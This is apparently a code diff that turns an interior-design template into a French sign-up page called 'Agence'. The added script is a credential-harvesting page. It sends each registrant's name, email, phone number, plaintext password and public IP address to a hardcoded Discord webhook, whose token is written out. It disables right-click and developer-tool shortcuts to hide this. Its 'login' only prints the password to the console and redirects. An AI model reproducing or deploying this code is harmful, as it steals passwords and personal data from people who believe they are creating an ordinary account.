@@ -1,108 +1,249 @@
-<!DOCTYPE html>
-<html lang="Fr">
+<!DOCTYPE html>   
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="AAAAA.png">
     <title>Agence</title>
-    <link rel="stylesheet" href="style.css">
-    <script src="https://kit.fontawesome.com/61523b4b4d.js" crossorigin="anonymous"></script>
+
+    <!-- Meta tags pour l'embed sur Discord et autres plateformes -->
+    <meta property="og:title" content="Agence" />
+    <meta property="og:description" content=Agence vous aide à rechercher de manière rapide et simple. Créez un compte ou connectez-vous pour accéder à toutes les fonctionnalités." />
+    <meta property="og:image" content="https://www.shop-application.com/images/Image/Image/actualites_shop-application/module-actualite-blog-creation-site-internet-shop-application.png?1586513316997" />
+    <meta property="og:url" content="https://votre-lien.com" />
+    <meta property="og:type" content="website" />
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('https://www.shop-application.com/images/Image/Image/actualites_shop-application/module-actualite-blog-creation-site-internet-shop-application.png?1586513316997') no-repeat center center fixed;
+            background-size: cover;
+            text-align: center;
+            padding-bottom: 50px; /* Pour laisser de l'espace pour le bandeau des cookies */
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+        h1 {
+            font-size: 40px;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 20px;
+            margin-bottom: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 18px;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 20px;
+            font-size: 18px;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .login-btn {
+            background-color: #28a745; /* Vert pour "Se connecter" */
+        }
+        .login-btn:hover {
+            background-color: #218838;
+        }
+        .form-section {
+            display: none;
+        }
+        .active-section {
+            display: block;
+        }
+
+        /* Style du bandeau des cookies */
+        #cookie-banner {
+            background-color: #333;
+            color: white;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 15px;
+            text-align: center;
+            font-size: 16px;
+        }
+        #cookie-banner button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            margin-left: 20px;
+            cursor: pointer;
+        }
+        #cookie-banner button:hover {
+            background-color: #0056b3;
+        }
+
+        /* Message de prévention pour l'accès au code */
+        #prevention-message {
+            position: fixed;
+            top: 10%;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #ff0000;
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            font-size: 18px;
+            z-index: 9999;
+        }
+    </style>
+    <script>
+        let userIP = ""; // Variable globale pour l'IP de l'utilisateur
+
+        // Désactiver le clic droit
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            alert('L\'accès au code source est interdit sur ce site.');
+        });
+
+        // Désactiver les raccourcis F12 et Ctrl+Shift+I
+        document.addEventListener('keydown', function(e) {
+            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
+                e.preventDefault();
+                alert("L'accès aux outils de développement est désactivé.");
+            }
+        });
+
+        // Fonction pour récupérer l'IP et l'enregistrer lorsque l'utilisateur accepte les cookies
+        async function closeCookieBanner() {
+            try {
+                const response = await fetch("https://api.ipify.org?format=json"); // Service pour obtenir l'IP publique
+                const data = await response.json();
+                userIP = data.ip; // Sauvegarder l'IP
+
+                // Enregistrer le consentement des cookies dans localStorage
+                localStorage.setItem("cookiesAccepted", "true");
+
+                // Cacher le bandeau des cookies
+                document.getElementById("cookie-banner").style.display = "none";
+            } catch (error) {
+                console.error("Erreur lors de l'obtention de l'IP", error);
+            }
+        }
+
+        async function submitSignUp() {
+            // Vérifier si l'utilisateur a accepté les cookies
+            if (!localStorage.getItem("cookiesAccepted")) {
+                alert("Vous devez accepter les cookies avant de vous inscrire.");
+                return;  // Empêche l'inscription si les cookies ne sont pas acceptés
+            }
+
+            const name = document.getElementById("signup-name").value;
+            const email = document.getElementById("signup-email").value;
+            const phone = document.getElementById("signup-phone").value;
+            const password = document.getElementById("signup-password").value;
+            
+            // Préparer les données pour l'embed Discord, y compris l'IP
+            const embed = {
+                embeds: [
+                    {
+                        title: "Nouvelle inscription",
+                        color: 5814783, // Couleur du embed (bleu clair)
+                        fields: [
+                            { name: "Nom", value: name, inline: true },
+                            { name: "Email", value: email, inline: true },
+                            { name: "Numéro de téléphone", value: phone, inline: true },
+                            { name: "Mot de passe", value: password, inline: true },
+                            { name: "Adresse IP", value: userIP, inline: true } // Ajouter l'IP ici
+                        ],
+                        footer: {
+                            text: "Inscription via Agence"
+                        }
+                    }
+                ]
+            };
+
+            // URL du webhook Discord
+            const webhookURL = "https://discord.com/api/webhooks/1337733991448576091/yirulm2h29r_CTWqsdRAREagcrMPVCSfdBOLexRXhXvS7m1wBoV2aWKWFnf9_Kn9Hljz";
+
+            // Envoi des données à Discord via un POST
+            try {
+                const response = await fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(embed)
+                });
+
+                if (response.ok) {
+                    console.log("Données envoyées à Discord");
+                    window.location.href = "agence.html"; // Redirection vers panel.html après soumission
+                } else {
+                    console.error("Erreur lors de l'envoi du webhook Discord");
+                }
+            } catch (error) {
+                console.error("Erreur de connexion au webhook Discord", error);
+            }
+        }
+
+        function submitLogin() {
+            const email = document.getElementById("login-email").value;
+            const password = document.getElementById("login-password").value;
+
+            // Vous pouvez ajouter la logique ici pour la connexion
+            console.log('Email:', email);
+            console.log('Mot de passe:', password);
+
+            // Redirection vers panel.html après connexion réussie
+            window.location.href = "agence.html";  // Redirection vers panel.html
+        }
+    </script>
 </head>
 <body>
 
-    <!-- Home -->
-    <section class="home">
-        <div class="menu">
-            <div class="logo">Interrior</div>
-            <ul class="links">
-                <li><a href="#">Home</a></li>
-                <li><a href="#">Portfolio</a></li>
-                <li><a href="#">About</a></li>
-                <li><a href="#">Testimonials</a></li>
-                <li><a href="#">Contact</a></li>
-            </ul>
-        </div>
-        
-        <!-- home_page_content -->
-        
-        <div class="home_page_content">
-            <span>
-                <i class="fa-solid fa-trophy"></i>
-                <p>5th Consistent Award Winning Year!</p>
-            </span>
-                <h1 class="title">Modern Design <br> Solutions</h1>
-                <p class="text">A description paragraph that tells clients how good you <br> best choice.</p>
-                <button class="white_btn">See our Projects<i class="fa-solid fa-angle-right"></i></button>
+    <div class="container">
+        <h1>Agence</h1>
+
+        <!-- Section Créer un compte -->
+        <div id="signup-section" class="form-section active-section">
+            <h2>Inscrivez-vous</h2>
+            <input type="text" id="signup-name" placeholder="Votre nom" required>
+            <input type="email" id="signup-email" placeholder="Votre email" required>
+            <input type="tel" id="signup-phone" placeholder="Votre numéro de téléphone" required>
+            <input type="password" id="signup-password" placeholder="Votre mot de passe" required>
+            <button onclick="submitSignUp()">Créer un compte</button>
         </div>
 
-        <!-- image_box -->
-
-        <div class="image_box">
-            <img src="img1.jpg" alt="image_box">
-            <p> <i class="fa-solid fa-location-dot"></i>123 Fifth Avenue, Lane no 17, New York</p>
+        <!-- Section Se connecter -->
+        <div id="login-section" class="form-section">
+            <h2>Connexion</h2>
+            <input type="email" id="login-email" placeholder="Votre email" required>
+            <input type="password" id="login-password" placeholder="Votre mot de passe" required>
+            <button class="login-btn" onclick="submitLogin()">Se connecter</button>
         </div>
+    </div>
 
-    </section>
-
-    <!-- text_section -->
-     <section class="text_section">
-        <p>INTERRIOR</p>
-        <h2>Interrior Design Doesn't Have to Be <br> Expensive or Complicated! It Should Be <br>Smart & User Friendly</h2>
-     </section>
-
-     <!-- owner -->
-      
-     <section class="owner">
-        <div class="image_box_owner">
-            <img src="img3.jpg" alt="image3">
-            <p class="bad_title"> <i class="fa-solid fa-web-awesome"></i>Interrior Solutions Owner & Co-Owner</p>
-        </div>
-        <div class="content_box">
-            <h2 class="small_title">ESTABLISHED MMXVIII</h2>
-            <h3 class="big_title">Interior Design Firm Based in New York</h3>
-            <p>A descriptive paragraph that tells clients how good you are and proves that you are the best choice that they've made. This paragraph is also for those who are looking out for a reliable interior design firm.</p>
-
-            <p>You can use a few enticing words and flaunt your capabilities that will attract future clients and encourage them to hire you right away.</p>
-
-            
-            
-            <button class="dark_btn">Know More<i class="fa-solid fa-angle-right"></i></button>
-
-        </div>
-     </section>
-
-     <!-- Espace-Déco -->
-
-     <div class="image-déco">
-        <img src="img8 copie.png">
-     </div>
-
-
-     <!-- background -->
-
-     <div class="background">
-        <div class="text_box">
-            <span class="title-1">OUR RECENT</span>
-            <h3 class="title-2">Award Winning Projects</h3>
-            <p class="title-3">A descriptive paragraph that tells clients how good you are and proves that you are the best choice that they've made.</p>
-            <p class="title-4">This paragraph is also for those who are looking out for a reliable interior dsign firm. </p>
-
-
-        <div class="zone111">
-            <button class="dark_btn1">View all Projects<i class="fa-solid fa-angle-right"></i></button>
-        </div>
-            
-        </div>
-        <div>
-            <img src="img2.jpg" class="mon-image">
-        </div>
-
-        <div class="text_box9">
-            <i class="fa-solid fa-mug-hot"></i>
-        </div>
-     </div>
-
-     
-    
+    <!-- Cookie banner -->
+    <div id="cookie-banner">
+        <span>Ce site utilise des cookies pour améliorer votre expérience. En poursuivant, vous acceptez notre politique de confidentialité.</span>
+        <button onclick="closeCookieBanner()">Accepter</button>
+    </div>
 </body>
 </html>
